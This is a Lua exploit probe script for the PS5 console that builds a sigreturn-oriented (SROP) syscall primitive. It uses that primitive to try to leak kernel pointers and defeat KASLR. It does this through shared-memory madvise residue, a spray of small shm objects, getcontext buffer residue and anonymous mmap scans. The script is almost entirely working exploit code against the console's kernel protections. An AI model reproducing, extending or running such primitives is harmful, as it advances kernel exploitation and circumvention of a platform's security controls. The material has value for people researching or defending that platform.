-- CRASH_CLASS: MODERATE
-- PROBE 156a: SHM/madvise kernel memory residue for KASLR
--
-- shm_open works on PS5! (probe 154a: fd=27, mmap OK, sentinel OK)
-- Theory: allocate shm pages, free them with madvise(MADV_FREE/DONTNEED),
-- then re-read. Freed pages may contain residual kernel heap data
-- including kernel pointers.
--
-- Also: try creating many small shm objects to spray kernel slab allocations,
-- then scan for leaked pointers in the backing pages.

print("=== PROBE 156a: SHM RESIDUE KASLR ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- [A] Create SHM, fill with pattern, madvise MADV_FREE, check for residue
print("--- [A] SHM MADV_FREE RESIDUE ---")

local name_off = 0x10000
local function write_name(s)
    for i = 1, #s do wd(gpu + name_off + i - 1, string.byte(s, i)) end
    wd(gpu + name_off + #s, 0)
end

-- Create shm
write_name("/res_test")
local shm_fd = srop(482, ga(name_off), uint64(0x0202), uint64(0x1B6))
local shmv = shm_fd and to_num(shm_fd) or -1
print("shm_fd=" .. shmv)

if shmv >= 0 then
    -- Truncate to 64KB (4 pages on PS5 16KB)
    local SZ = 0x10000
    srop(480, uint64(shmv), uint64(SZ))

    -- mmap it
    local shm_map = srop(477, uint64(0), uint64(SZ), uint64(3),
        uint64(1), uint64(shmv), uint64(0))
    local smh, sml = get_hi_lo(shm_map)
    print("shm_map=0x" .. string.format("%X%08X", smh, sml))

    if smh ~= 0xFFFFFFFF then
        -- Fill with known pattern
        for off = 0, SZ - 4, 4 do
            pcall(function() memory.write_dword(shm_map + off, 0xAAAAAAAA) end)
        end

        -- madvise(75) MADV_FREE=5, MADV_DONTNEED=4
        -- MADV_FREE: kernel may free pages, next access gets zero-fill
        -- MADV_DONTNEED: kernel discards pages immediately
        local ma1 = srop(75, shm_map, uint64(SZ), uint64(5))
        local m1v = ma1 and to_num(ma1) or -999
        print("madvise(MADV_FREE)=" .. m1v)

        -- Read back — might see kernel residue instead of 0xAAAAAAAA
        local kptrs = 0
        local changed = 0
        for off = 0, SZ - 8, 8 do
            local ok, val = pcall(function() return memory.read_qword(shm_map + off) end)
            if ok then
                local vh, vl = get_hi_lo(val)
                -- Check for kernel pointers
                if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                    kptrs = kptrs + 1
                    print("  KPTR +" .. string.format("%04X", off) .. "=0x" .. string.format("%X%08X", vh, vl))
                end
                -- Check if data changed from our pattern
                if vh ~= 0xAAAAAAAA or vl ~= 0xAAAAAAAA then
                    changed = changed + 1
                    if changed <= 5 then
                        print("  changed +" .. string.format("%04X", off) .. "=0x" .. string.format("%X%08X", vh, vl))
                    end
                end
            end
        end
        print("kptrs=" .. kptrs .. " changed=" .. changed)

        -- Try MADV_DONTNEED (more aggressive)
        -- Re-fill first
        for off = 0, SZ - 4, 4 do
            pcall(function() memory.write_dword(shm_map + off, 0xBBBBBBBB) end)
        end
        local ma2 = srop(75, shm_map, uint64(SZ), uint64(4))
        local m2v = ma2 and to_num(ma2) or -999
        print("madvise(MADV_DONTNEED)=" .. m2v)

        -- Read back
        local kptrs2 = 0
        local changed2 = 0
        for off = 0, SZ - 8, 8 do
            local ok, val = pcall(function() return memory.read_qword(shm_map + off) end)
            if ok then
                local vh, vl = get_hi_lo(val)
                if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                    kptrs2 = kptrs2 + 1
                    print("  KPTR2 +" .. string.format("%04X", off) .. "=0x" .. string.format("%X%08X", vh, vl))
                end
                if vh ~= 0xBBBBBBBB or vl ~= 0xBBBBBBBB then
                    changed2 = changed2 + 1
                    if changed2 <= 5 then
                        print("  changed2 +" .. string.format("%04X", off) .. "=0x" .. string.format("%X%08X", vh, vl))
                    end
                end
            end
        end
        print("kptrs2=" .. kptrs2 .. " changed2=" .. changed2)

        srop(73, shm_map, uint64(SZ))
    end
    srop(6, uint64(shmv))
    srop(483, ga(name_off))
end

-- [B] Spray many small SHM objects, scan for kernel heap residue
print("")
print("--- [B] SHM SPRAY + SCAN ---")

local spray_fds = {}
for i = 1, 20 do
    write_name("/spray" .. i)
    local fd = srop(482, ga(name_off), uint64(0x0202), uint64(0x1B6))
    local fv = fd and to_num(fd) or -1
    if fv < 0 then break end
    spray_fds[i] = fv
    srop(480, uint64(fv), uint64(0x4000))  -- one 16KB page each
end
print("spray_count=" .. #spray_fds)

-- Map and scan each one
local total_kptrs = 0
for i = 1, #spray_fds do
    local mp = srop(477, uint64(0), uint64(0x4000), uint64(1),
        uint64(1), uint64(spray_fds[i]), uint64(0))
    local mph, mpl = get_hi_lo(mp)
    if mph ~= 0xFFFFFFFF then
        for off = 0, 0x3FF8, 8 do
            local ok, val = pcall(function() return memory.read_qword(mp + off) end)
            if ok then
                local vh, vl = get_hi_lo(val)
                if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                    total_kptrs = total_kptrs + 1
                    print("  shm" .. i .. " +" .. string.format("%04X", off)
                        .. "=0x" .. string.format("%X%08X", vh, vl))
                end
            end
        end
        srop(73, mp, uint64(0x4000))
    end
end
print("spray_kptrs=" .. total_kptrs)

-- Cleanup spray
for i = 1, #spray_fds do
    srop(6, uint64(spray_fds[i]))
end

-- [C] Uninitialized stack residue via SROP
-- When we call getcontext, the kernel saves state. But if we call
-- a syscall that fails fast, the kernel stack might have residual data.
-- Read the SROP context area for any kernel pointers.
print("")
print("--- [C] SROP CONTEXT RESIDUE ---")

local ctx2 = memory.alloc(0x500)
-- Fill with pattern
for off = 0, 0x4F8, 8 do
    memory.write_qword(ctx2 + off, uint64("0xCCCCCCCCCCCCCCCC"))
end

-- Call getcontext
pcall(function() return sc_gc(uint64(ctx2)) end)

-- Scan all 0x500 bytes for kernel pointers
local ctx_kptrs = 0
for off = 0, 0x4F8, 8 do
    local val = memory.read_qword(ctx2 + off)
    local vh, vl = get_hi_lo(val)
    if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
        ctx_kptrs = ctx_kptrs + 1
        print("  ctx+" .. string.format("%03X", off) .. "=0x" .. string.format("%X%08X", vh, vl))
    end
    if vh ~= 0xCCCCCCCC and off > 0x40 and off < 0x100 then
        -- Also print non-zero non-pattern values in the mcontext range
        if vh ~= 0 or vl ~= 0 then
            -- Skip known values
        end
    end
end
print("ctx_kptrs=" .. ctx_kptrs)

-- [D] Try anonymous mmap, write, madvise, check for residue
print("")
print("--- [D] ANON MMAP RESIDUE ---")

local anon_map = srop(477, uint64(0), uint64(0x10000), uint64(3),
    uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
local amh, aml = get_hi_lo(anon_map)
print("anon_map=0x" .. string.format("%X%08X", amh, aml))

if amh ~= 0xFFFFFFFF then
    -- Touch all pages to fault them in
    for off = 0, 0xFFFC, 0x4000 do
        pcall(function() memory.write_dword(anon_map + off, 0xDDDDDDDD) end)
    end
    -- madvise DONTNEED
    srop(75, anon_map, uint64(0x10000), uint64(4))
    -- Re-read
    local ak = 0
    for off = 0, 0xFFF8, 8 do
        local ok, val = pcall(function() return memory.read_qword(anon_map + off) end)
        if ok then
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                ak = ak + 1
                print("  anon+" .. string.format("%04X", off) .. "=0x" .. string.format("%X%08X", vh, vl))
            end
        end
    end
    print("anon_kptrs=" .. ak)
    srop(73, anon_map, uint64(0x10000))
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
